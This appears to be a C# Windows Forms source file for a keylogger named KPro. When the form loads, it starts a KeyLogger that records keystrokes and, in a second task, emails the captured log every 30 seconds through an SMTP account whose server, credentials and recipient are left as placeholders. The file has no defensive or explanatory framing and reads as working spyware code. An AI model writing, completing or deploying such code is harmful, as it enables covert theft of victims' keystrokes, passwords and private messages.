using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KPro
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            var mailInfo = new MailInfo(@"<smtp.server>", @"<MailFrom>", @"<Password>", @"<MailTo>");
            var keyLogger = new KeyLogger(mailInfo);

            var loggingTask = new Task(() => keyLogger.StartLogging());
            loggingTask.Start();
            var sendingTask = new Task(() => keyLogger.StartSendingMail(30000, true));
            sendingTask.Start();

            loggingTask.Wait();
            sendingTask.Wait();
        }
    }
}
